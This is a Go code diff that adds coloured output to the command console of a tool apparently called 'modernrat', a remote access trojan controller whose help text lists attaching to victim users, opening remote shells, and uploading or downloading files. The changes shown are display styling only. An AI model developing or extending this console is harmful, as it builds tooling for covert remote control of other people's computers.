@@ -26,7 +26,7 @@ type adminApp struct {
 var errCommandExit = errors.New("exit command requested")
 
 func (a *adminApp) run() error {
-	fmt.Println("Type 'help' for a list of commands.")
+	fmt.Printf("Type %s for a list of commands.\n", uiColors.wrap(uiColors.accent, "'help'"))
 
 	for {
 		select {
@@ -35,11 +35,12 @@ func (a *adminApp) run() error {
 		default:
 		}
 
-		prompt := "modernrat"
+		prompt := uiColors.wrap(uiColors.prompt, "modernrat")
 		if a.attachedUser != "" {
-			prompt += fmt.Sprintf("(%s)", shortUserID(a.attachedUser))
+			userTag := fmt.Sprintf("(%s)", shortUserID(a.attachedUser))
+			prompt += uiColors.wrap(uiColors.promptUser, userTag)
 		}
-		prompt += "> "
+		prompt += uiColors.wrap(uiColors.promptSymbol, "> ")
 
 		line, err := readLine(prompt)
 		if err != nil {
@@ -58,7 +59,7 @@ func (a *adminApp) run() error {
 
 		args, err := parseArguments(line)
 		if err != nil {
-			fmt.Printf("入力の解析に失敗しました: %v\n", err)
+			fmt.Printf("%s %v\n", uiColors.wrap(uiColors.error, "入力の解析に失敗しました:"), err)
 			continue
 		}
 		if len(args) == 0 {
@@ -76,7 +77,7 @@ func (a *adminApp) run() error {
 			if errors.Is(err, io.EOF) {
 				return nil
 			}
-			fmt.Printf("エラー: %v\n", err)
+			fmt.Printf("%s %v\n", uiColors.wrap(uiColors.error, "エラー:"), err)
 		}
 	}
 }
@@ -97,23 +98,23 @@ func (a *adminApp) executeCommand(cmd string, args []string) error {
 		}
 		a.attachedUser = userID
 		a.defaultUser = userID
-		fmt.Printf("Attached to user %s\n", userID)
+		fmt.Printf("Attached to user %s\n", uiColors.wrap(uiColors.accent, userID))
 		return nil
 
 	case "detach":
 		if a.attachedUser == "" {
-			fmt.Println("現在 attach しているユーザーはありません")
+			fmt.Println(uiColors.wrap(uiColors.warn, "現在 attach しているユーザーはありません"))
 			return nil
 		}
-		fmt.Printf("Detached from user %s\n", a.attachedUser)
+		fmt.Printf("Detached from user %s\n", uiColors.wrap(uiColors.accent, a.attachedUser))
 		a.attachedUser = ""
 		return nil
 
 	case "session", "sessions", "status":
 		if a.attachedUser == "" {
-			fmt.Println("未 attach")
+			fmt.Println(uiColors.wrap(uiColors.warn, "未 attach"))
 		} else {
-			fmt.Printf("Attached user: %s\n", a.attachedUser)
+			fmt.Printf("Attached user: %s\n", uiColors.wrap(uiColors.accent, a.attachedUser))
 		}
 		return nil
 
@@ -273,17 +274,17 @@ func extractUserFlag(args []string) (string, []string, error) {
 }
 
 func printHelp() {
-	fmt.Println("利用可能なコマンド:")
-	fmt.Println("  help                    - このヘルプを表示")
-	fmt.Println("  attach <user_id>        - 指定ユーザーに attach")
-	fmt.Println("  detach                  - 現在の attach を解除")
-	fmt.Println("  status                  - attach 状態を表示")
-	fmt.Println("  list [filter]           - ユーザー一覧 (ページング対応)")
-	fmt.Println("  shell [user_id]         - リモートシェルを起動 (:upload/:download 利用可)")
-	fmt.Println("  upload <local> [remote] [--user <id>]   - ファイルをアップロード")
-	fmt.Println("  download <remote> [local] [--user <id>] - ファイルをダウンロード")
-	fmt.Println("  clear                   - 画面をクリア")
-	fmt.Println("  exit                    - 終了")
+	fmt.Println(uiColors.wrap(uiColors.accent, "利用可能なコマンド:"))
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "help"), "このヘルプを表示")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "attach <user_id>"), "指定ユーザーに attach")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "detach"), "現在の attach を解除")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "status"), "attach 状態を表示")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "list [filter]"), "ユーザー一覧 (ページング対応)")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "shell [user_id]"), "リモートシェルを起動 (:upload/:download 利用可)")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "upload <local> [remote] [--user <id>]"), "ファイルをアップロード")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "download <remote> [local] [--user <id>]"), "ファイルをダウンロード")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "clear"), "画面をクリア")
+	fmt.Printf("  %-24s %s\n", uiColors.wrap(uiColors.accent, "exit"), "終了")
 }
 
 func shortUserID(userID string) string {
